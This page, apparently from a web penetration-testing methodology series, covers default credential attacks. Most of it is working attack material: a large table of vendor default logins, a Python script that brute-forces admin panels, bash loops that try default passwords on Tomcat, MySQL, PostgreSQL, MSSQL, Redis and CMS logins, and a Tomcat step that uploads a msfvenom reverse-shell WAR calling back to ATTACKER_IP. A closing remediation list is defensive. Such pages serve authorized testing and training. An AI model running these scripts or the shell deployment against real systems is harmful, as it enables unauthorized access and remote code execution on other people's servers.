---
title: "Default Credentials"
date: 2026-02-24
draft: false
---

# Default Credentials

> **Severity**: Critical | **CWE**: CWE-1392, CWE-521
> **OWASP**: A07:2021 – Identification and Authentication Failures

---

## What Is the Attack?

Default credential attacks target systems where the vendor-supplied default username/password was never changed. This encompasses network devices, databases, application frameworks, content management systems, IoT devices, and cloud management consoles. Despite being one of the oldest attacks, it remains one of the most consistently successful — particularly against internal network services discovered through prior access, and against externally-facing admin interfaces.

The attack is not just about trying `admin:admin`. Effective methodology requires: identifying the exact product and version, locating the correct default for that version, and accounting for credential evolution (some products use dynamic defaults based on serial number, MAC, or installation token).

---

## Discovery Checklist

**Phase 1 — Product Fingerprinting**
- [ ] Identify software: HTTP headers (`Server:`, `X-Powered-By:`), login page title/logo, HTML comments, `robots.txt`, `favicon.ico` hash
- [ ] Identify version: About pages, API version endpoints, update check URLs, error messages with version strings
- [ ] Check if product uses serial-number-based defaults (routers, IoT)
- [ ] Find the product's default credentials in documentation or default credential databases

**Phase 2 — Credential Collection**
- [ ] Check vendor documentation for default admin account
- [ ] Check SecLists default credentials database
- [ ] Check CIRT.net default password database
- [ ] Check if credentials are in product installer/GitHub repo
- [ ] For cloud SaaS installs: check setup wizard — was initial password set?

**Phase 3 — Systematic Testing**
- [ ] Test all identified defaults (may be multiple per product)
- [ ] Test common universal defaults: `admin:admin`, `admin:password`, `root:root`
- [ ] Check if product requires password change on first login (and whether that was done)
- [ ] Test API endpoints separately from web UI (different auth systems)

---

## Payload Library

### Payload 1 — Default Credential Database by Product

```bash
# Critical default credentials by product category:

# ===== Network Devices =====
# Cisco IOS:         cisco:cisco, cisco:Cisco, admin:admin, admin:(blank)
# Cisco ASA:         admin:admin, admin:(blank)
# Cisco Wireless:    Cisco:Cisco, admin:admin
# Fortinet FortiGate: admin:(blank), admin:admin
# Palo Alto PAN-OS:  admin:admin
# Juniper:           root:(blank), netscreen:netscreen
# MikroTik:          admin:(blank)
# Ubiquiti:          ubnt:ubnt, admin:ubnt
# NETGEAR:           admin:password, admin:1234
# Linksys:           admin:admin, admin:(blank)
# TP-Link:           admin:admin, admin:tplink1
# Zyxel:             admin:1234, admin:admin

# ===== Databases =====
# MySQL:             root:(blank), root:root, root:mysql
# MariaDB:           root:(blank), root:root
# PostgreSQL:        postgres:postgres, postgres:(blank)
# Oracle:            system:manager, sys:change_on_install, dbsnmp:dbsnmp
# MSSQL:             sa:(blank), sa:sa, sa:password
# MongoDB:           (no auth by default in old versions)
# Redis:             (no auth by default)
# Elasticsearch:     (no auth in old versions)
# CouchDB:           admin:admin (if not configured)
# Cassandra:         cassandra:cassandra

# ===== Web Applications =====
# WordPress:         admin:admin (if installer not completed)
# Drupal:            admin:admin
# Joomla:            admin:admin
# phpMyAdmin:        root:(blank), root:root
# Magento:           admin:admin123
# PrestaShop:        admin@admin.com:admin
# OpenCart:          admin:admin

# ===== Application Servers =====
# Apache Tomcat:     tomcat:tomcat, admin:admin, manager:manager
#   → Manager URL: /manager/html
# JBoss/WildFly:     admin:admin, admin:jboss
# WebLogic:          weblogic:weblogic1, weblogic:welcome1
# GlassFish:         admin:adminadmin
# WebSphere:         admin:admin, wasadmin:wasadmin

# ===== CI/CD / DevOps =====
# Jenkins:           admin:admin, (no auth if security not configured)
# GitLab:            root:5iveL!fe (first login), root:password
# Nexus:             admin:admin123
# Artifactory:       admin:password
# SonarQube:         admin:admin
# Portainer:         admin:tryportainer
# Rancher:           admin:admin
# Harbor:            admin:Harbor12345

# ===== Monitoring =====
# Grafana:           admin:admin
# Kibana:            (elastic:changeme for Elasticsearch)
# Zabbix:            Admin:zabbix, admin:zabbix
# Nagios:            nagiosadmin:nagios, admin:nagios
# Prometheus:        (no auth by default)

# ===== Messaging =====
# RabbitMQ:          guest:guest
# ActiveMQ:          admin:admin
# Kafka:             (no auth by default)
# NATS:              (no auth by default in older versions)

# ===== Containers / Orchestration =====
# Docker daemon:     (no auth — just socket access)
# Kubernetes dashboard: (no auth in misconfigured setups)
# Consul:            (no auth by default in dev mode)
# Vault:             (root token from init)

# ===== SCADA / Industrial =====
# Siemens S7:        admin:(blank), (no auth)
# Modbus:            (protocol has no auth)
# Allen Bradley:     (no auth by default)
```

### Payload 2 — Automated Default Credential Testing

```python
#!/usr/bin/env python3
"""
Automated default credential testing for web applications
"""
import requests, time

# Default credentials database:
DEFAULT_CREDS = {
    "tomcat": [("tomcat","tomcat"), ("admin","admin"), ("manager","manager"),
               ("tomcat","s3cret"), ("admin","password"), ("both","tomcat")],
    "grafana": [("admin","admin"), ("admin","grafana"), ("admin","password")],
    "jenkins": [("admin","admin"), ("jenkins","jenkins"), ("admin","password")],
    "sonarqube": [("admin","admin"), ("admin","sonar")],
    "nexus": [("admin","admin123"), ("admin","admin")],
    "portainer": [("admin","tryportainer"), ("admin","admin"), ("admin","password")],
    "rabbitmq": [("guest","guest"), ("admin","admin")],
    "wordpress": [("admin","admin"), ("admin","password"), ("wordpress","wordpress")],
    "phpmyadmin": [("root",""), ("root","root"), ("root","password"), ("admin","admin")],
    "zabbix": [("Admin","zabbix"), ("admin","zabbix"), ("Admin","admin")],
    "generic": [("admin","admin"), ("admin","password"), ("admin","1234"), ("admin",""),
                ("root","root"), ("root","password"), ("root",""), ("user","user"),
                ("test","test"), ("demo","demo"), ("guest","guest")],
}

def test_http_basic(url, creds):
    """Test HTTP Basic Authentication"""
    results = []
    for user, pwd in creds:
        r = requests.get(url, auth=(user, pwd), timeout=10, verify=False)
        if r.status_code not in (401, 403):
            results.append((user, pwd, r.status_code))
    return results

def test_form_login(url, username_field, password_field, creds,
                    success_indicator=None, failure_indicator="invalid"):
    """Test form-based login"""
    results = []
    for user, pwd in creds:
        r = requests.post(url,
                         data={username_field: user, password_field: pwd},
                         allow_redirects=True, timeout=10, verify=False)
        if success_indicator and success_indicator.lower() in r.text.lower():
            results.append((user, pwd, "SUCCESS"))
        elif failure_indicator.lower() not in r.text.lower() and r.status_code < 400:
            results.append((user, pwd, f"POSSIBLE ({r.status_code})"))
        time.sleep(0.3)
    return results

# Test targets:
targets = [
    {"type": "basic", "url": "http://TARGET:8080/manager/html", "product": "tomcat"},
    {"type": "form", "url": "http://TARGET:3000/login", "product": "grafana",
     "user_field": "user", "pass_field": "password", "success": "Dashboard"},
    {"type": "form", "url": "http://TARGET:8080/j_spring_security_check", "product": "jenkins",
     "user_field": "j_username", "pass_field": "j_password", "success": "Dashboard"},
    {"type": "form", "url": "http://TARGET:15672/#/login", "product": "rabbitmq",
     "user_field": "username", "pass_field": "password", "success": "Overview"},
]

for target in targets:
    print(f"\n[*] Testing {target['type']} auth at {target['url']}")
    creds = DEFAULT_CREDS.get(target["product"], DEFAULT_CREDS["generic"])

    if target["type"] == "basic":
        hits = test_http_basic(target["url"], creds)
    else:
        hits = test_form_login(
            target["url"],
            target.get("user_field", "username"),
            target.get("pass_field", "password"),
            creds,
            target.get("success"),
        )

    for user, pwd, status in hits:
        print(f"  [!!!] SUCCESS: {user}:{pwd} → {status}")
```

### Payload 3 — Tomcat Manager Default Credentials

```bash
# Tomcat Manager — full RCE if default creds work:
TARGET="http://TARGET:8080"
CREDS=("tomcat:tomcat" "admin:admin" "manager:manager" "tomcat:s3cret" "admin:password" "both:tomcat" "role1:role1")

for cred in "${CREDS[@]}"; do
  user="${cred%%:*}"
  pass="${cred##*:}"
  status=$(curl -s -u "$user:$pass" -o /dev/null -w "%{http_code}" \
    "$TARGET/manager/html")
  echo "$user:$pass → $status"
  if [ "$status" = "200" ]; then
    echo "[!!!] VALID CREDENTIALS: $user:$pass"
    # Deploy malicious WAR:
    msfvenom -p java/jsp_shell_reverse_tcp LHOST=ATTACKER_IP LPORT=4444 \
      -f war -o shell.war 2>/dev/null
    curl -s -u "$user:$pass" "$TARGET/manager/text/deploy?path=/shell&update=true" \
      --upload-file shell.war
    echo "Deployed: $TARGET/shell/"
    break
  fi
done

# Tomcat text-based manager (alternative endpoint):
curl -u "tomcat:tomcat" "$TARGET/manager/text/list"
```

### Payload 4 — Database Default Credential Testing

```bash
# MySQL/MariaDB:
for cred in "root:" "root:root" "root:mysql" "root:password" "root:toor" "admin:admin"; do
  user="${cred%%:*}"; pass="${cred##*:}"
  mysql -h TARGET -u "$user" ${pass:+-p"$pass"} -e "SELECT user();" 2>/dev/null && \
    echo "[!!!] MySQL: $cred WORKS" || echo "[ ] MySQL: $cred failed"
done

# PostgreSQL:
for cred in "postgres:" "postgres:postgres" "postgres:password"; do
  user="${cred%%:*}"; pass="${cred##*:}"
  PGPASSWORD="$pass" psql -h TARGET -U "$user" -c "SELECT current_user;" 2>/dev/null && \
    echo "[!!!] Postgres: $cred WORKS"
done

# MSSQL:
for cred in "sa:" "sa:sa" "sa:password" "sa:admin"; do
  user="${cred%%:*}"; pass="${cred##*:}"
  sqlcmd -S TARGET -U "$user" -P "$pass" -Q "SELECT @@version" 2>/dev/null | \
    grep -q "Microsoft" && echo "[!!!] MSSQL: $cred WORKS"
done

# MongoDB (unauthenticated):
mongo --host TARGET --eval "db.adminCommand({listDatabases: 1})" 2>/dev/null | \
  grep -q "databases" && echo "[!!!] MongoDB: NO AUTH REQUIRED"

# Redis (unauthenticated or default password):
redis-cli -h TARGET ping 2>/dev/null | grep -q "PONG" && echo "[!!!] Redis: NO AUTH"
redis-cli -h TARGET -a "" ping 2>/dev/null | grep -q "PONG" && echo "[!!!] Redis: BLANK PASS"
redis-cli -h TARGET -a "redis" ping 2>/dev/null | grep -q "PONG" && echo "[!!!] Redis: redis/redis"
```

### Payload 5 — CMS Default Credential Testing

```bash
# WordPress:
wp_test() {
  url="$1"
  user="$2"
  pass="$3"
  # Login via AJAX:
  result=$(curl -s -c /tmp/wp_cookies.txt -X POST \
    "$url/wp-login.php" \
    -d "log=$user&pwd=$pass&wp-submit=Log+In&redirect_to=%2Fwp-admin%2F&testcookie=1" \
    -b "wordpress_test_cookie=WP+Cookie+check" \
    -L)
  if echo "$result" | grep -q "Dashboard\|wp-admin"; then
    echo "[!!!] WordPress login: $user:$pass"
    # Check if admin:
    curl -s -b /tmp/wp_cookies.txt "$url/wp-admin/users.php" | grep -c "Administrator"
  fi
}

for cred in "admin:admin" "admin:password" "admin:wordpress" "administrator:administrator"; do
  wp_test "https://target.com" "${cred%%:*}" "${cred##*:}"
done

# Drupal:
for cred in "admin:admin" "admin:password" "admin:drupal"; do
  curl -s -X POST "https://target.com/user/login" \
    -d "name=${cred%%:*}&pass=${cred##*:}&form_id=user_login_form&op=Log+in" \
    -L | grep -q "Log out" && echo "[!!!] Drupal: $cred"
done

# Joomla:
for cred in "admin:admin" "admin:password" "admin:joomla"; do
  TOKEN=$(curl -s "https://target.com/administrator/index.php" | \
    grep -oP 'name="[0-9a-f]{32}"\s+value="1"' | head -1 | grep -oP 'name="\K[^"]+')
  curl -s -X POST "https://target.com/administrator/index.php" \
    -d "username=${cred%%:*}&passwd=${cred##*:}&option=com_login&task=login&return=aW5kZXgucGhw&$TOKEN=1" \
    -L | grep -q "Logout" && echo "[!!!] Joomla: $cred"
done
```

---

## Tools

```bash
# nuclei — automated default credential testing:
nuclei -target https://target.com -t default-logins/ -v

# Specific default login templates:
nuclei -target http://TARGET:8080 -t default-logins/apache/ -t default-logins/tomcat/
nuclei -target http://TARGET:3000 -t default-logins/grafana/
nuclei -target http://TARGET:9000 -t default-logins/portainer/

# Medusa — network service default credential testing:
medusa -h TARGET -u admin -P /usr/share/seclists/Passwords/Default-Credentials/default-passwords.txt \
  -M http -m "POST:https://target.com/login:username=^USER^&password=^PASS^:Invalid credentials"

# Hydra — multi-service default credential testing:
hydra -C /usr/share/seclists/Passwords/Default-Credentials/tomcat-betterdefaultpasslist.txt \
  -s 8080 TARGET http-get /manager/html

# SecLists default credentials:
ls /usr/share/seclists/Passwords/Default-Credentials/
# ftp-betterdefaultpasslist.txt
# http-betterdefaultpasslist.txt
# mssql-betterdefaultpasslist.txt
# mysql-betterdefaultpasslist.txt
# oracle-betterdefaultpasslist.txt
# postgres-betterdefaultpasslist.txt
# tomcat-betterdefaultpasslist.txt
# windows-betterdefaultpasslist.txt

# CIRT.net password database (online):
# https://www.cirt.net/passwords — searchable by manufacturer/product

# changeme — dedicated default credential scanner:
git clone https://github.com/ztgrace/changeme
python3 changeme.py --all --target https://target.com

# Router default credentials:
# routersploit:
pip3 install routersploit
rsf> use scanners/autopwn
rsf (AutoPwn)> set target TARGET
rsf (AutoPwn)> run
```

---

## Remediation Reference

- **Change all defaults during deployment**: make default credential change mandatory before any service is accessible — block access until credentials are changed
- **Remove default accounts**: disable or delete vendor-supplied default accounts (e.g., Tomcat's `tomcat` user) — create named service accounts instead
- **Inventory**: maintain an asset inventory of all services and their authentication state — include scan for default credentials in deployment checklists
- **Network segmentation**: management interfaces should not be internet-accessible regardless of authentication state
- **Password policy enforcement**: enforce complexity requirements for admin passwords — reject passwords from common/default lists
- **First-time setup wizard**: application should force users through a setup wizard that includes credential configuration before serving any content
- **Monitoring**: alert on successful login to management interfaces from unusual source IPs or outside business hours

*Part of the Web Application Penetration Testing Methodology series.*
